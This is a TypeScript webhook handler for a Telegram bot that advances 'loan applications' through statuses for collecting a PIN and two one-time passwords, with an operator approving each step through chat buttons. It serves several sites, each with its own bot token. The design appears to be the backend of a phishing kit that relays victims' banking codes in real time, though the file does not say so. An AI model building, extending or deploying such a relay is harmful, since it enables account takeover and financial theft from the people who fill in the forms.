import { createFileRoute } from "@tanstack/react-router";

// status transitions: submitted -> otp1_required -> otp1_submitted -> pin_required
//   -> pin_submitted -> otp2_required -> otp2_submitted -> completed
const NEXT_ON_APPROVE: Record<string, string> = {
  submitted: "otp1_required",
  otp1_submitted: "pin_required",
  pin_submitted: "otp2_required",
  otp2_submitted: "completed",
};

const RETRY_TARGET: Record<string, string> = {
  otp1_submitted: "otp1_required",
  pin_submitted: "pin_required",
  otp2_submitted: "otp2_required",
};

export const Route = createFileRoute("/api/public/telegram/webhook")({
  server: {
    handlers: {
      POST: async ({ request }) => {
        const secret = process.env.TELEGRAM_WEBHOOK_SECRET;
        const headerSecret = request.headers.get(
          "x-telegram-bot-api-secret-token",
        );
        if (secret && headerSecret !== secret) {
          return new Response("Unauthorized", { status: 401 });
        }

        const update = await request.json().catch(() => null);
        if (!update) return Response.json({ ok: true });

        const cb = update.callback_query;
        if (!cb?.data) return Response.json({ ok: true });

        const parts = String(cb.data).split(":");
        // Support legacy "approve:<id>" + new "approve:<fromStatus>:<id>"
        let action: string, fromStatus: string | undefined, id: string | undefined;
        if (parts.length === 3) {
          [action, fromStatus, id] = parts;
        } else {
          [action, id] = parts;
        }
        if (!["approve", "reject", "retry", "pinretry"].includes(action) || !id) {
  return Response.json({ ok: true });
}

        const { getSupabaseAdmin } = await import(
          "@/lib/supabase-admin.server"
        );
        const supabase = getSupabaseAdmin();

        // Look up the current status so we know what to advance to
        const { data: current, error: fetchErr } = await supabase
          .from("loan_applications")
          .select("status, site_id")
          .eq("id", id)
          .single();
        let botToken = process.env.TELEGRAM_BOT_TOKEN || "";
        if (current?.site_id) {
          const { data: site } = await supabase
            .from("sites")
            .select("telegram_bot_token")
            .eq("id", current.site_id)
            .maybeSingle();
          if (site?.telegram_bot_token) botToken = site.telegram_bot_token;
        }
        if (fetchErr || !current) {
          await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              callback_query_id: cb.id,
              text: "Application not found",
            }),
          });
          return Response.json({ ok: true });
        }

        const effectiveFrom = fromStatus ?? current.status;
        let newStatus: string;

if (action === "reject") {
  newStatus = "rejected";
} else if (action === "pinretry") {
  newStatus = "pin_required";
} else if (action === "retry") {
  newStatus = RETRY_TARGET[effectiveFrom] ?? current.status;
} else {
  newStatus = NEXT_ON_APPROVE[effectiveFrom] ?? current.status;
}

        const { data: row, error } = await supabase
          .from("loan_applications")
          .update({
            status: newStatus,
            ...(newStatus === "completed" || newStatus === "rejected"
              ? { decided_at: new Date().toISOString() }
              : {}),
          })
          .eq("id", id)
          .select()
          .single();

        // Acknowledge the button press
        await fetch(
          `https://api.telegram.org/bot${botToken}/answerCallbackQuery`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              callback_query_id: cb.id,
              text: error
                ? `Error: ${error.message}`
                : `Set to ${newStatus}`,
            }),
          },
        );

        // Update the original message: strip buttons, append status
        if (!error && row && cb.message) {
          const newText =
            (cb.message.text ?? "") +
            `\n\n— Decision: ${newStatus.toUpperCase()} by ${
              cb.from?.username ? "@" + cb.from.username : cb.from?.first_name ?? "admin"
            }`;
          await fetch(
            `https://api.telegram.org/bot${botToken}/editMessageText`,
            {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: cb.message.chat.id,
                message_id: cb.message.message_id,
                text: newText,
              }),
            },
          );
        }

        return Response.json({ ok: true });
      },
    },
  },
});
